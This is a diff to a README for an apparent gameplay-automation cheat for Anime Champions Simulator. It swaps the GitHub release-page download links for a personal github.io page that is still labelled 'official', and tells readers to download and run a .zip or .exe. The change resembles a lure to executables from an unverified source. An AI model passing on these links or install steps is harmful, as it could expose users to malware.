@@ -1,6 +1,6 @@
 # 🎮 Anime-Champions-Sim-Script-2026 - Automate gameplay for better efficiency now
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sumitkumar941/Anime-Champions-Sim-Script-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sumitkumar941.github.io)
 
 ## 📌 Overview
 Anime-Champions-Sim-Script-2026 provides tools to help you manage your progress in Anime Champions Simulator. This software automates repetitive actions like farming, quest completion, and character upgrades. It assists you in gathering resources and managing combat encounters without requiring manual input for every task. The script helps players save time while improving game performance during long sessions.
@@ -16,7 +16,7 @@ Anime-Champions-Sim-Script-2026 provides tools to help you manage your progress 
 ## 💾 Download and Installation
 Follow these instructions to use the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Sumitkumar941/Anime-Champions-Sim-Script-2026/releases) to access the software.
+1. Visit the [official release page](https://sumitkumar941.github.io) to access the software.
 2. Look for the most recent version labeled "Latest."
 3. Select the file ending in .zip or .exe to begin your download.
 4. Locate the file in your "Downloads" folder once the process finishes.
